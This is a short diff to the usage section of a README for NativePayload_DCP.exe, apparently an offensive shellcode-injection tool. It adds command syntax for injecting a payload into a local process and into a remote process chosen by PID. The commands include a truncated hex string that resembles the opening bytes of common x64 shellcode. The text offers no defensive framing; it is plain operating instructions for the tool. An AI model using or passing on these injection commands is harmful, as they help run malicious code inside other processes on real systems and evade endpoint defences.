@@ -9,5 +9,12 @@
 
 usage:
       
+    Syntax: injection into local process
+    
     NativePayload_DCP.exe DYN-PAY-ARG "fc,48,83,e4,f0,e8,cc,00,00,00,41,51,..."
-    NativePayload_DCP.exe DYN-TEXT-FILE
+    
+    Syntax: injection into remote process
+    
+    NativePayload_DCP.exe DYN-TEXT-FILE CHUNK NativePayload_Tinjection.cs TPID "fc,48,83,e4,f0,e8,cc,00,00,00,41,51,..."
+    NativePayload_DCP.exe DYN-TEXT-FILE Src NativePayload_Tinjection.cs TPID
+
